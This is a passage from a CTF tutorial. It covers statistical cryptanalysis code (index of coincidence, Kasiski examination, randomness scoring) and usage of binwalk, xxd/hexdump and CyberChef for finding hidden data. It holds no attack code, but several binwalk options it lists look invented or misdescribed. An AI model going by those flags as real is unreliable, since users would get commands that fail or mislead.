    Analyze Index of Coincidence with interpretation
    """
    ioc = index_of_coincidence(data)
    
    print(f"Index of Coincidence: {ioc:.6f}")
    
    if data_type == 'text':
        if 0.06 <= ioc <= 0.07:
            print("[Inference: Consistent with English text]")
        elif 0.04 <= ioc < 0.06:
            print("[Inference: May be polyalphabetic cipher or non-English]")
        elif ioc < 0.04:
            print("[Inference: Appears random or strongly encrypted]")
        else:
            print("[Inference: Unusual pattern - investigate further]")
    elif data_type == 'bytes':
        expected_random = 1.0 / 256
        if ioc < 0.005:
            print("[Inference: Consistent with random/encrypted data]")
        elif ioc > 0.01:
            print("[Inference: Non-uniform distribution detected]")
    
    return ioc

# Example usage
english_text = "THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG " * 10
random_text = ''.join(chr(random.randint(65, 90)) for _ in range(500))

print("=== English Text ===")
analyze_ioc(english_text, data_type='text')

print("\n=== Random Text ===")
analyze_ioc(random_text, data_type='text')

print("\n=== Random Bytes ===")
random_bytes = bytes([random.randint(0, 255) for _ in range(1000)])
analyze_ioc(random_bytes, data_type='bytes')
```

**Kasiski Examination (Repeating Patterns)**

```python
def find_repeated_sequences(data, min_length=3, max_length=10):
    """
    Find repeated sequences in data
    Used in Kasiski examination for polyalphabetic ciphers
    
    [Inference: Repeated sequences may reveal key length]
    """
    from collections import defaultdict
    
    sequences = defaultdict(list)
    
    # Find all sequences
    for seq_len in range(min_length, max_length + 1):
        for i in range(len(data) - seq_len + 1):
            if isinstance(data, (bytes, bytearray)):
                seq = data[i:i+seq_len]
            else:
                seq = data[i:i+seq_len]
            
            sequences[seq].append(i)
    
    # Filter to only repeated sequences
    repeated = {seq: positions for seq, positions in sequences.items() 
                if len(positions) > 1}
    
    return repeated

def kasiski_examination(data, min_length=3, max_length=6):
    """
    Perform Kasiski examination to estimate key length
    
    [Inference: Distances between repetitions often share factors with key length]
    """
    from collections import Counter
    import math
    
    repeated = find_repeated_sequences(data, min_length, max_length)
    
    # Calculate distances between repetitions
    distances = []
    for seq, positions in repeated.items():
        for i in range(len(positions) - 1):
            distance = positions[i+1] - positions[i]
            distances.append(distance)
    
    if not distances:
        print("No repeated sequences found")
        return None
    
    # Find GCD of all distances
    def gcd_list(numbers):
        result = numbers[0]
        for num in numbers[1:]:
            result = math.gcd(result, num)
        return result
    
    # Count factor frequencies
    factors = []
    for distance in distances:
        for factor in range(2, min(distance + 1, 30)):
            if distance % factor == 0:
                factors.append(factor)
    
    factor_counter = Counter(factors)
    
    print("Kasiski Examination Results:")
    print(f"Found {len(repeated)} repeated sequences")
    print(f"Analyzed {len(distances)} distances\n")
    
    print("Most common factors (likely key lengths):")
    print(f"{'Factor':<10} {'Frequency':<15} {'Visual'}")
    print("-" * 50)
    
    for factor, count in factor_counter.most_common(10):
        bar_length = int((count / max(factor_counter.values())) * 30)
        bar = '█' * bar_length
        print(f"{factor:<10} {count:<15} {bar}")
    
    # Best guess for key length
    if factor_counter:
        likely_key_length = factor_counter.most_common(1)[0][0]
        print(f"\nLikely key length: {likely_key_length}")
        return likely_key_length
    
    return None

# Example usage - Vigenere cipher
def vigenere_encrypt(plaintext, key):
    """Simple Vigenere cipher for testing"""
    ciphertext = []
    key = key.upper()
    plaintext = plaintext.upper()
    
    key_index = 0
    for char in plaintext:
        if char.isalpha():
            shift = ord(key[key_index % len(key)]) - ord('A')
            encrypted = chr((ord(char) - ord('A') + shift) % 26 + ord('A'))
            ciphertext.append(encrypted)
            key_index += 1
        else:
            ciphertext.append(char)
    
    return ''.join(ciphertext)

# Test Kasiski examination
plaintext = "THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG " * 20
key = "SECRET"
ciphertext = vigenere_encrypt(plaintext, key)

print("=== Kasiski Examination on Vigenere Cipher ===")
print(f"Actual key length: {len(key)}\n")
estimated_length = kasiski_examination(ciphertext)
```

**Combined Statistical Attack Framework**

```python
def comprehensive_statistical_analysis(data, data_type='unknown'):
    """
    Perform comprehensive statistical analysis on cryptographic data
    
    Args:
        data: bytes, bytearray, or string
        data_type: 'bytes', 'text', or 'unknown'
    
    Returns:
        Dictionary with all statistical measures
    """
    results = {
        'sample_size': len(data),
        'data_type': data_type
    }
    
    print("="*60)
    print("COMPREHENSIVE STATISTICAL ANALYSIS")
    print("="*60)
    print(f"Sample size: {len(data)} {'bytes' if isinstance(data, (bytes, bytearray)) else 'characters'}\n")
    
    # 1. Entropy Analysis
    print("1. ENTROPY ANALYSIS")
    print("-" * 40)
    results['entropy'] = calculate_entropy(data)
    print(f"Shannon Entropy: {results['entropy']:.4f} bits/symbol")
    
    if isinstance(data, (bytes, bytearray)):
        max_ent = 8.0
    else:
        unique_symbols = len(set(data))
        max_ent = math.log2(unique_symbols) if unique_symbols > 0 else 0
    
    print(f"Maximum possible: {max_ent:.4f}")
    print(f"Entropy ratio: {(results['entropy']/max_ent)*100:.2f}%\n")
    
    # 2. Randomness Tests
    if isinstance(data, (bytes, bytearray)) and len(data) >= 100:
        print("2. RANDOMNESS TESTS")
        print("-" * 40)
        bits = bytes_to_bits(data)
        
        try:
            results['frequency_test'] = frequency_test(bits)
            print(f"Frequency test p-value: {results['frequency_test']:.6f}")
        except:
            results['frequency_test'] = None
            print("Frequency test: Failed")
        
        try:
            results['runs_test'] = runs_test(bits)
            print(f"Runs test p-value: {results['runs_test']:.6f}")
        except:
            results['runs_test'] = None
            print("Runs test: Failed")
        
        print()
    
    # 3. Distribution Analysis
    print("3. DISTRIBUTION ANALYSIS")
    print("-" * 40)
    
    if isinstance(data, (bytes, bytearray)):
        chi_result = chi_square_test(data)
        results['chi_square'] = chi_result
        print(f"Chi-square statistic: {chi_result['chi_square']:.2f}")
        print(f"P-value: {chi_result['p_value']:.6f}")
        print(f"Distribution: {'Uniform' if chi_result['is_uniform'] else 'Non-uniform'}\n")
    
    # 4. Pattern Detection
    print("4. PATTERN DETECTION")
    print("-" * 40)
    
    results['ioc'] = index_of_coincidence(data)
    print(f"Index of Coincidence: {results['ioc']:.6f}")
    
    autocorr = autocorrelation(data, max_lag=min(20, len(data)//4))
    results['autocorrelation'] = autocorr
    significant_autocorr = sum(1 for ac in autocorr[1:] if abs(ac) > 0.1)
    print(f"Significant autocorrelations: {significant_autocorr}/{len(autocorr)-1}\n")
    
    # 5. Overall Assessment
    print("5. OVERALL ASSESSMENT")
    print("-" * 40)
    
    score = 0
    max_score = 0
    
    # Entropy check
    if results['entropy'] / max_ent > 0.9:
        score += 1
        print("✓ High entropy (good randomness)")
    else:
        print("✗ Low entropy (potential patterns)")
    max_score += 1
    
    # Randomness tests
    if 'frequency_test' in results and results['frequency_test']:
        if results['frequency_test'] > 0.01:
            score += 1
            print("✓ Passed frequency test")
        else:
            print("✗ Failed frequency test")
        max_score += 1
    
    # Distribution
    if 'chi_square' in results:
        if results['chi_square']['is_uniform']:
            score += 1
            print("✓ Uniform distribution")
        else:
            print("✗ Non-uniform distribution")
        max_score += 1
    
    # Autocorrelation
    if significant_autocorr == 0:
        score += 1
        print("✓ No significant autocorrelations")
    else:
        print(f"✗ Found {significant_autocorr} significant autocorrelations")
    max_score += 1
    
    results['quality_score'] = score / max_score if max_score > 0 else 0
    
    print(f"\nQuality Score: {score}/{max_score} ({results['quality_score']*100:.0f}%)")
    
    if results['quality_score'] >= 0.75:
        print("[Assessment: HIGH QUALITY - Appears cryptographically strong]")
    elif results['quality_score'] >= 0.5:
        print("[Assessment: MEDIUM QUALITY - Some weaknesses detected]")
    else:
        print("[Assessment: LOW QUALITY - Significant weaknesses found]")
    
    print("="*60)
    
    return results

# Example usage
print("\n### Testing with GOOD cipher (AES simulation)")
import hashlib
good_data = hashlib.sha256(b"test" * 100).digest() * 10
comprehensive_statistical_analysis(good_data, data_type='bytes')

print("\n\n### Testing with WEAK cipher (repeating XOR)")
weak_key = b"KEY"
plaintext = b"The quick brown fox jumps over the lazy dog" * 20
weak_data = bytes([p ^ weak_key[i % len(weak_key)] 
                   for i, p in enumerate(plaintext)])
comprehensive_statistical_analysis(weak_data, data_type='bytes')
```

---

**Important Related Topics:**

- NIST SP 800-22 complete test suite implementation
- Diehard and TestU01 randomness test batteries
- Time-series analysis for side-channel attacks
- Frequency analysis for classical ciphers
- Machine learning approaches to statistical cryptanalysis
- Differential power analysis (DPA) and correlation power analysis (CPA)

---

## Tools

### binwalk (hidden data)

`binwalk` is a firmware analysis tool that scans binary files for embedded file systems, executable code, compressed archives, and cryptographic signatures. In CTF contexts, it excels at identifying hidden data, steganography, and multi-layered file structures through signature-based detection and entropy analysis.

**Core Functionality**:

- Signature scanning for known file types
- Entropy analysis to detect encrypted/compressed sections
- Automatic extraction of embedded files
- Firmware unpacking and analysis

**Installation and Setup**:

```bash
# Kali Linux (pre-installed)
binwalk --help

# Update signatures
sudo apt update
sudo apt install binwalk

# Install extraction dependencies
sudo apt install p7zip-full unrar-free squashfs-tools

# Python module (for scripting)
pip3 install binwalk
```

**Basic Usage**:

```bash
# Simple signature scan
binwalk file.bin

# Verbose output with detailed information
binwalk -v file.bin

# Scan with hexdump at each signature match
binwalk -W file.bin

# Recursively scan extracted files
binwalk -M file.bin

# Scan specific offset range
binwalk --offset=0x1000 --length=0x5000 file.bin
```

**Automatic Extraction**:

```bash
# Extract all detected files (-e)
binwalk -e file.bin
# Creates directory: _file.bin.extracted/

# Extract with depth limit (prevent recursion bomb)
binwalk -e --depth=3 file.bin

# Extract specific signatures only
binwalk -e --signature="gzip,zip" file.bin

# Preserve directory structure during extraction
binwalk -e --preserve-symlinks file.bin

# Extract with carving (recover incomplete files)
binwalk -e --carve file.bin
```

**Entropy Analysis**:

```bash
# Generate entropy graph
binwalk -E file.bin
# Creates file.png showing entropy distribution

# Entropy with custom parameters
binwalk -E -F file.bin
# High entropy = compressed/encrypted
# Low entropy = plaintext/structured data

# Entropy scan without graph generation
binwalk -E -J file.bin

# Analyze specific block size
binwalk -E -K 1024 file.bin
```

**Signature Management**:

```bash
# List all known signatures
binwalk -B

# Show signature file location
binwalk --show-signatures

# Use custom signature file
binwalk -C custom_signatures.txt file.bin

# Scan for specific file types
binwalk --include="zip,gzip,jpeg" file.bin

# Exclude certain signatures
binwalk --exclude="certificate" file.bin
```

**Advanced Scanning Techniques**:

```bash
# Raw scan (no smart filtering)
binwalk -R file.bin

# Byte-level scan (very slow, very thorough)
binwalk -A file.bin

# Opcode scan (identify executable code)
binwalk -O file.bin

# Cast scan (identify code architecture)
binwalk -Y file.bin
```

**CTF-Specific Workflows**:

```bash
# Complete analysis workflow
binwalk -Mev file.bin
# -M: Matryoshka (recursive)
# -e: Extract
# -v: Verbose

# Find hidden archives
binwalk --dd=".*" file.bin
# Extract everything regardless of signature

# Search for encrypted sections
binwalk -E file.bin | grep -A 5 "Rising entropy"

# Scan PNG for hidden data
binwalk suspicious.png
# Look for: zip, gzip, 7z after IEND chunk

# Scan with specific file system signatures
binwalk --fstype=ext file.bin
```

**Python Scripting Integration**:

```python
#!/usr/bin/env python3
"""
Automated binwalk analysis for CTF
"""

import binwalk
import os

def analyze_file(filename):
    """
    Comprehensive binwalk analysis
    """
    print(f"[*] Analyzing: {filename}")
    
    # Signature scan
    print("\n[*] Signature Scan:")
    for module in binwalk.scan(filename, signature=True, quiet=True):
        for result in module.results:
            print(f"    {result.offset:#x}: {result.description}")
    
    # Entropy analysis
    print("\n[*] Entropy Analysis:")
    for module in binwalk.scan(filename, entropy=True, quiet=True):
        for result in module.results:
            entropy = result.description.split(':')[-1].strip()
            if float(entropy) > 0.9:
                print(f"    {result.offset:#x}: HIGH ENTROPY ({entropy})")
    
    # Extract files
    print("\n[*] Extracting files...")
    for module in binwalk.scan(filename, signature=True, extract=True, quiet=True):
        print(f"    Extracted to: {module.extractor.directory}")
    
    return True

# Usage
if __name__ == "__main__":
    analyze_file("suspicious_file.bin")
```

**Entropy-Based Hidden Data Detection**:

```python
import binwalk
import numpy as np

def detect_hidden_data_entropy(filename, threshold=0.95):
    """
    Detect potential encrypted/compressed hidden data using entropy
    
    Args:
        filename: File to analyze
        threshold: Entropy threshold (0.0-1.0)
    
    Returns:
        List of suspicious regions
    """
    suspicious_regions = []
    
    for module in binwalk.scan(filename, entropy=True, quiet=True):
        for result in module.results:
            # Parse entropy value
            entropy_str = result.description.split(':')[-1].strip()
            entropy_val = float(entropy_str)
            
            if entropy_val >= threshold:
                suspicious_regions.append({
                    'offset': result.offset,
                    'entropy': entropy_val,
                    'description': result.description
                })
    
    return suspicious_regions

# Find high-entropy regions (likely encrypted)
# regions = detect_hidden_data_entropy("file.bin", threshold=0.98)
# for region in regions:
#     print(f"Suspicious at {region['offset']:#x}: {region['entropy']}")
```

**Extracting Specific File Types**:

```bash
# Extract only ZIP files
binwalk -D 'zip:zip:zip' file.bin

# Extract JPEG images
binwalk -D 'jpeg:jpg:jpeg' file.bin

# Extract ELF executables
binwalk -D 'elf:elf:elf' file.bin

# Extract with custom command
binwalk --dd='gzip:gz:gzip -dc > %e' file.bin

# Extract specific offset manually
dd if=file.bin of=extracted.zip bs=1 skip=$((0x1234))
```

**Firmware-Specific Analysis**:

```bash
# Identify file system types
binwalk -A firmware.bin | grep filesystem

# Extract squashfs file system
binwalk -e firmware.bin
cd _firmware.bin.extracted/
unsquashfs -d extracted_fs squashfs-root.img

# Extract JFFS2 file system
jefferson squashfs-root.img output_dir/

# Analyze boot loader
binwalk -O firmware.bin | grep -i "boot"

# Find compression signatures
binwalk firmware.bin | grep -E "(LZMA|gzip|xz)"
```

**Steganography Detection**:

```bash
# Check for appended data after valid file
binwalk image.jpg
# Look for signatures after JPEG EOI marker (FF D9)

# Scan audio files
binwalk audio.wav
# Common: ZIP archives appended to WAV

# PDF analysis
binwalk document.pdf
# Look for: embedded streams, scripts, files

# Polyglot file detection
binwalk suspicious_file
# Multiple valid signatures indicate polyglot
```

**Handling Obfuscated Data**:

```bash
# Scan with all available signatures
binwalk -I file.bin

# Force scan even if not a recognized file type
binwalk -f file.bin

# Scan raw binary (no magic byte filtering)
binwalk -A -R file.bin

# Custom byte patterns
binwalk --search='\x50\x4B\x03\x04' file.bin
# Search for ZIP signature manually
```

**Scripted Extraction Pipeline**:

```bash
#!/bin/bash
# automated_binwalk.sh - Complete extraction pipeline

FILE="$1"
OUTDIR="${FILE}_analysis"

mkdir -p "$OUTDIR"
cd "$OUTDIR"

echo "[*] Running signature scan..."
binwalk "../$FILE" > signature_scan.txt

echo "[*] Running entropy analysis..."
binwalk -E "../$FILE"

echo "[*] Extracting files..."
binwalk -Me "../$FILE"

echo "[*] Finding strings in extracted files..."
find . -type f -exec strings {} \; > all_strings.txt

echo "[*] Checking for flags..."
grep -r "flag{" . || grep -r "CTF{" .

echo "[*] Analysis complete. Results in: $OUTDIR"
```

**Common CTF Patterns**:

```bash
# Pattern 1: ZIP appended to image
binwalk image.png
# If ZIP found, extract from offset:
dd if=image.png of=hidden.zip bs=1 skip=OFFSET

# Pattern 2: Nested archives
binwalk -Me archive.bin
# Check _archive.bin.extracted/ recursively

# Pattern 3: Encrypted section identification
binwalk -E file.bin
# High entropy regions = encrypted/compressed

# Pattern 4: False file extension
file suspicious.txt
binwalk suspicious.txt
# May reveal actual file type

# Pattern 5: Firmware with embedded flag
binwalk -Me firmware.bin
find _firmware.bin.extracted -name "*flag*"
```

**Performance Optimization**:

```bash
# Fast scan (signature only, no extraction)
binwalk -B file.bin

# Parallel processing for multiple files
parallel binwalk -e ::: *.bin

# Limit extraction size (prevent disk exhaustion)
binwalk -e --max-size=100M file.bin

# Skip known file types to speed up
binwalk --exclude="certificate,private key" file.bin
```

**Integration with Other Tools**:

```bash
# binwalk + foremost for comprehensive extraction
binwalk -e file.bin
foremost -i file.bin -o foremost_output/

# binwalk + strings for text search
binwalk -e file.bin
strings -n 8 _file.bin.extracted/* | grep -i flag

# binwalk + file identification
binwalk file.bin | while read line; do
    if [[ $line =~ 0x([0-9A-F]+) ]]; then
        offset=$((16#${BASH_REMATCH[1]}))
        echo "Checking offset $offset"
        dd if=file.bin bs=1 skip=$offset count=512 2>/dev/null | file -
    fi
done
```

**Troubleshooting and Debugging**:

```bash
# No signatures found - try raw scan
binwalk -A file.bin

# Extraction failed - check dependencies
binwalk -e -v file.bin
# Read error messages for missing tools

# False positives - use stricter matching
binwalk -g 0x100 file.bin
# -g sets minimum signature reliability

# Corrupted extraction - try manual dd
binwalk file.bin  # Note offset
dd if=file.bin of=manual.ext bs=1 skip=OFFSET

# Permission errors
sudo binwalk -e file.bin
chmod -R 755 _file.bin.extracted/
```

**Custom Signature Creation**:

```bash
# Create custom signature file
cat > custom.sig << 'EOF'
0       string  FLAG{       Flag marker
0       string  \x89PNG     PNG image
0       string  PK\x03\x04  ZIP archive
EOF

# Use custom signatures
binwalk -C custom.sig file.bin

# Add to global signatures
sudo cp custom.sig /usr/share/binwalk/magic/
```

**Output Formats**:

```bash
# JSON output (for parsing)
binwalk -J file.bin

# CSV output
binwalk --csv file.bin

# Format for grep
binwalk file.bin | grep -E "0x[0-9A-F]+"

# Machine-readable extraction log
binwalk -e --log=extraction.log file.bin
```

**Real-World CTF Examples** [Inference]:

```bash
# Example 1: PNG with appended ZIP
binwalk challenge.png
# Output shows ZIP at offset 0x12AB
dd if=challenge.png of=hidden.zip bs=1 skip=$((0x12AB))
unzip hidden.zip

# Example 2: Nested firmware layers
binwalk -Me firmware.img
cd _firmware.img.extracted
# May find multiple filesystem layers
# flag.txt often in /etc/, /root/, or /tmp/

# Example 3: Entropy-based detection
binwalk -E mystery.bin
# Look for sudden entropy spike
# Extract high-entropy region for cryptanalysis

# Example 4: Polyglot files
binwalk polyglot
# Shows multiple valid file signatures
# Each signature may lead to different content
```

**Common Signatures** [Inference based on typical detections]:

```
Offset      Signature              Description
------      ---------              -----------
0x0         PK\x03\x04             ZIP archive
0x0         \x1F\x8B               GZIP compressed
0x0         7z\xBC\xAF\x27\x1C     7-Zip archive
0x0         Rar!                   RAR archive
0x0         \x89PNG                PNG image
0x0         \xFF\xD8\xFF           JPEG image
0x0         \x50\x4B\x03\x04       ZIP/DOCX/XLSX
0x0         %PDF                   PDF document
0x0         \x7FELF                ELF executable
0x0         MZ                     PE executable
```

### xxd, hexdump (hex analysis)

`xxd` and `hexdump` are hex dump utilities that display binary file contents in hexadecimal format with ASCII representation. These tools are essential for low-level binary analysis, identifying file structures, finding hidden data, and manual cryptographic analysis in CTF challenges.

**xxd - Hexdump and Reverse Operations**:

**Basic Usage**:

```bash
# Standard hex dump
xxd file.bin

# Output format:
# 00000000: 504b 0304 1400 0000 0800 0000 0000 0000  PK..............
# Offset    Hex bytes (16 per line)                  ASCII

# Limit output lines
xxd -l 256 file.bin
# Show first 256 bytes only

# Start from specific offset
xxd -s 0x1000 file.bin
# Skip to offset 0x1000

# Combine offset and length
xxd -s 0x100 -l 64 file.bin
# Read 64 bytes starting at 0x100

# Uppercase hex
xxd -u file.bin
```

**Output Formats**:

```bash
# Binary output (bits)
xxd -b file.bin
# 00000000: 01010000 01001011 00000011 00000100  PK..

# Plain hex dump (no offset/ASCII)
xxd -p file.bin
# 504b03041400000008000000000000000000...

# Plain hex, continuous (no line breaks)
xxd -p -c 256 file.bin
# Single line output

# C array format
xxd -i file.bin
# unsigned char file_bin[] = {
#   0x50, 0x4b, 0x03, 0x04, ...
# };

# Include format (C header)
xxd -i file.bin > file.h
```

**Reverse Operations (Hex to Binary)**:

```bash
# Convert hex dump back to binary
xxd -r hexdump.txt output.bin

# Create binary from plain hex
echo "504b0304" | xxd -r -p > file.zip

# Pipe operations
echo "48656c6c6f" | xxd -r -p
# Output: Hello

# Modify binary via hex
xxd file.bin > file.hex
# Edit file.hex in text editor
xxd -r file.hex > modified.bin

# Patch specific bytes
printf '\x41\x42\x43' | xxd -r > patch.bin
```

**Advanced Options**:

```bash
# Custom column width
xxd -c 32 file.bin
# 32 bytes per line instead of 16

# Group bytes differently
xxd -g 1 file.bin   # 1-byte groups (default)
xxd -g 2 file.bin   # 2-byte groups (words)
xxd -g 4 file.bin   # 4-byte groups (dwords)
xxd -g 8 file.bin   # 8-byte groups (qwords)

# Seek and read (useful for large files)
xxd -s +0x1000 file.bin      # Seek forward
xxd -s -0x100 file.bin       # Seek from end

# Auto-skip null bytes
xxd -a file.bin
# Shows * for repeated null bytes
```

**CTF Analysis Techniques**:

```bash
# Find magic bytes
xxd file.bin | head -n 1
# Check first 16 bytes for file signature

# Search for specific hex pattern
xxd file.bin | grep "504b 0304"
# Find ZIP signatures

# Extract specific offset range
xxd -s 0x500 -l 0x100 file.bin | xxd -r > extracted.bin

# Compare two files
diff <(xxd file1.bin) <(xxd file2.bin)
# or
xxd file1.bin > file1.hex
xxd file2.bin > file2.hex
diff file1.hex file2.hex

# Find ASCII strings in hex
xxd file.bin | grep -E "[3-7][0-9a-f]"
# Hex values 30-7F are printable ASCII
```

**Hexdump - Alternative Hex Viewer**:

**Basic Usage**:

```bash
# Canonical hex+ASCII dump
hexdump -C file.bin

# Output format (similar to xxd):
# 00000000  50 4b 03 04 14 00 00 00  08 00 00 00 00 00 00 00  |PK..............|

# Two-byte octal display
hexdump -b file.bin

# Two-byte decimal display
hexdump -d file.bin

# Two-byte hex display
hexdump -x file.bin
# 0000000    4b50    0403    0014    0000    0008    0000    0000    0000

# Four-byte hex display (little-endian)
hexdump -X file.bin
```

**Custom Format Strings**:

```bash
# Custom format: offset + hex + ASCII
hexdump -e '"%08_ax  " 16/1 "%02x " "  |" 16/1 "%_p" "|\n"' file.bin

# Show only hex bytes (no offset)
hexdump -e '16/1 "%02x " "\n"' file.bin

# Decimal byte values
hexdump -e '16/1 "%3d " "\n"' file.bin

# Single byte per line with offset
hexdump -e '"%08_ax  %02x\n"' file.bin

# Four bytes as 32-bit integer
hexdump -e '"%08_ax  %08x\n"' -n 4 file.bin
```

**Practical CTF Scenarios**:

```bash
# Scenario 1: Find hidden ZIP in image
xxd image.jpg | grep "504b 0304"
# Note offset, extract:
OFFSET=0x1234
dd if=image.jpg of=hidden.zip bs=1 skip=$((OFFSET))

# Scenario 2: XOR cipher detection
xxd encrypted.bin | head -n 20
# Look for repeating patterns that suggest XOR key

# Scenario 3: Manual file carving
xxd large_file.bin | grep "ffd8 ff"  # JPEG start
xxd large_file.bin | grep "ffd9"     # JPEG end
# Extract between offsets

# Scenario 4: Compare encrypted vs plaintext
xxd -g 1 plaintext.txt > pt.hex
xxd -g 1 ciphertext.bin > ct.hex
paste pt.hex ct.hex | head
# Visual comparison for XOR key discovery
```

**Byte Manipulation Scripts**:

```bash
# XOR two files byte-by-byte
xxd -p file1.bin > f1.hex
xxd -p file2.bin > f2.hex
python3 << 'EOF'
f1 = open('f1.hex').read().replace('\n', '')
f2 = open('f2.hex').read().replace('\n', '')
result = ''.join(format(int(f1[i:i+2], 16) ^ int(f2[i:i+2], 16), '02x')
                 for i in range(0, min(len(f1), len(f2)), 2))
print(result)
EOF

# Reverse bytes
xxd -p file.bin | fold -w2 | tac | tr -d '\n' | xxd -r -p > reversed.bin

# Swap byte order (endianness)
xxd -e file.bin > swapped.hex
xxd -r swapped.hex > swapped.bin
```

**Finding Patterns**:

```bash
# Find repeating bytes
xxd file.bin | awk '{print $2}' | sort | uniq -c | sort -rn | head

# Identify potential key length (Kasiski examination)
xxd -p -c 1000000 file.bin | grep -o '...' | sort | uniq -d

# Find null byte runs
xxd file.bin | grep -E "(0000 ){4,}"

# Find non-ASCII bytes
xxd file.bin | grep -v "^[0-9a-f]\+:.*[[:print:]]"
```

**Hex Editing Workflow**:

```bash
# 1. Create hex dump
xxd file.bin > file.hex

# 2. Edit in text editor
# Change hex values (keep format intact)
nano file.hex

# 3. Apply changes
xxd -r file.hex > modified.bin

# 4. Verify changes
diff <(xxd file.bin) <(xxd modified.bin)
```

**Quick Reference Commands**:

```bash
# First 16 bytes (magic signature)
xxd -l 16 file.bin

# Last 16 bytes (footer/signature)
xxd -s -16 file.bin

# Bytes at specific offset
xxd -s 0x100 -l 4 file.bin

# Extract byte range
xxd -s 0x100 -l 0x50 -p file.bin | xxd -r -p > range.bin

# Display as C array
xxd -i -l 32 file.bin

# Show binary representation
xxd -b -l 8 file.bin

# Check for patterns
xxd file.bin | head -n 100 | grep -E "([0-9a-f]{2})\1{3,}"
```

**Analyzing Encryption/Encoding**:

```bash
# Check entropy visually
xxd file.bin | head -n 50
# Random hex = high entropy (encrypted/compressed)
# Patterns = low entropy (plaintext/structured)

# Base64 encoded data in hex
xxd file.bin | grep -E "[3-5][0-9a-f]" | head
# Look for ASCII range of base64 chars

# ROT13 detection (hex shift by 13)
xxd -g 1 file.txt | awk '{print $2, $3, $4}' | head

# Check for common compression headers
xxd -l 4 file.bin
# 1F8B = gzip, 504B = ZIP, 425A = bzip2, FD37 = xz
```

**Scripted Analysis**:

```python
#!/usr/bin/env python3
"""
Hex analysis automation
"""

import subprocess
import re

def get_hex_at_offset(filename, offset, length=16):
    """Extract hex bytes at specific offset"""
    cmd = f"xxd -s {offset} -l {length} -p {filename}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def find_pattern(filename, hex_pattern):
    """Find all occurrences of hex pattern"""
    cmd = f"xxd -p {filename}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    hex_data = result.stdout.replace('\n', '')
    positions = []
    
    for match in re.finditer(hex_pattern, hex_data):
        # Convert character position to byte offset
        byte_offset = match.start() // 2
        positions.append(byte_offset)
    
    return positions

def analyze_file_structure(filename):
    """Identify file structure from hex patterns"""
    # Get first 16 bytes
    header = get_hex_at_offset(filename, 0, 16)
    
    signatures = {
        '504b0304': 'ZIP archive',
        '1f8b08': 'GZIP compressed',
        'ffd8ff': 'JPEG image',
        '89504e47': 'PNG image',
        '25504446': 'PDF document',
        '7f454c46': 'ELF executable',
        '4d5a': 'PE executable (MZ)',
    }
    
    for sig, desc in signatures.items():
        if header.startswith(sig):
            return desc
    
    return 'Unknown'

# Example usage
# file_type = analyze_file_structure('mystery.bin')
# zip_locations = find_pattern('file.bin', '504b0304')
```

**Byte Frequency Analysis**:

```bash
# Count byte occurrences
xxd -p -c 1 file.bin | sort | uniq -c | sort -rn | head -n 20

# Visualize byte distribution (Python)
python3 << 'EOF'
import sys
from collections import Counter

with open('file.bin', 'rb') as f:
    data = f.read()

counts = Counter(data)
for byte_val in range(256):
    count = counts[byte_val]
    bar = '#' * (count // 100)
    print(f"{byte_val:02x}: {count:6d} {bar}")
EOF

# Chi-square test for randomness
xxd -p file.bin | python3 << 'EOF'
import sys
from collections import Counter

hex_data = sys.stdin.read().replace('\n', '')
bytes_data = bytes.fromhex(hex_data)

expected = len(bytes_data) / 256
chi_square = sum((count - expected)**2 / expected 
                  for count in Counter(bytes_data).values())

print(f"Chi-square: {chi_square:.2f}")
print(f"Random if > 100, structured if < 100")
EOF
```

**Integration with Other Tools**:

```bash
# xxd + grep for pattern finding
xxd file.bin | grep -B2 -A2 "504b"

# hexdump + awk for specific bytes
hexdump -C file.bin | awk '/flag/{print; exit}'

# xxd + dd for extraction
OFFSET=$(xxd file.bin | grep "504b" | head -n1 | cut -d: -f1)
dd if=file.bin of=extracted.zip bs=1 skip=$((0x$OFFSET))

# xxd + diff for file comparison
diff <(xxd file1.bin) <(xxd file2.bin) | grep "^<" | head

# hexdump + python for analysis
hexdump -ve '1/1 "%02x\n"' file.bin | python3 analyze.py
```

**Common CTF Patterns** [Inference]:

```
Pattern                  Meaning
-------                  -------
Repeating 00             Null padding or unused space
High variety bytes       Encrypted or compressed data
ASCII-range hex          Base64, text, or encoded data
Repeating short pattern  XOR encryption with key
Regular intervals        Block cipher or structured data
Sudden entropy change    Embedded file or boundary
FF FF FF FF              Possible separator or marker
```

### CyberChef

CyberChef is a web-based data transformation and analysis framework developed by GCHQ, offering 300+ operations for encoding, encryption, compression, and data analysis. Its visual "recipe" approach makes complex multi-stage cryptographic operations accessible for CTF challenges without writing code.

**Access and Setup**:

```bash
# Online version (recommended)
# https://gchq.github.io/CyberChef/

# Offline/local installation
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
npm run build
# Open build/prod/CyberChef.html in browser

# Docker deployment
docker run -p 8080:80 mpepping/cyberchef
# Access at http://localhost:8080
```

**Interface Components**:

```
┌─────────────────────────────────────────────────┐
│ Operations (left panel)                         │
│  - Search operations                            │
│  - Drag to Recipe                               │
├─────────────────────────────────────────────────┤
│ Recipe (center)                                 │
│  - Stacked operations                           │
│  - Configure parameters                         │
│  - Reorder/delete operations                    │
├─────────────────────────────────────────────────┤
│ Input (top right)                               │
│  - Paste/load data                              │
│  - File upload                                  │
├─────────────────────────────────────────────────┤
│ Output (bottom right)                           │
│  - View results                                 │
│  - Download/copy                                │
└─────────────────────────────────────────────────┘
```

**Essential Operations for CTF**:

**Encoding/Decoding**:

```
From Base64
To Base64
From Hex
To Hex
From Binary
To Binary
URL Decode
URL Encode
HTML Entity Decode
Unicode Text Format
ROT13
Atbash Cipher
From Base32
From Base58
From Base85
```

**Cryptography**:

```
AES Decrypt
AES Encrypt
DES Decrypt
Triple DES Decrypt
RC4
XOR
XOR Brute Force
Vigenère Decode
Affine Cipher Decode
Rail Fence Cipher Decode
RSA Decrypt
Derive PBKDF2 key
```

**Hashing**:

```
MD5
SHA1
SHA2 (256, 384, 512)
SHA3
HMAC
Bcrypt
Scrypt
```

**Compression**:

```
Gunzip
Unzip
Bzip2 Decompress
Raw Inflate
Zlib Inflate
```

**Data Format**:

```
JSON Beautify
JSON Minify
XML Beautify
Parse IPv4 header
From Hex Dump
To Hex Dump
```

**Common CTF Recipes**:

**Recipe 1: Multi-layer Encoding**

```
Operation chain:
1. From Base64
2. From Hex
3. ROT13
4. URL Decode

